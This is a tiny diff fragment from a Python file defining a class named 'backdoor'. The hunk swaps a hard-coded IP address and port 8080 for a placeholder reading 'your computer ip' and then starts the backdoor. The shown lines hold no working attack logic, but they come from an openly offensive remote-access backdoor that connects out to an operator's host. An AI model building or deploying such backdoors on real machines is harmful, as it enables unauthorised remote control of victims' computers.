@@ -77,5 +77,5 @@ class backdoor:
 
 		self.connection.close()
 
-process_backdoor = backdoor("10.0.2.25",8080)
+process_backdoor = backdoor("your computer ip",8080)
 process_backdoor.start_door()
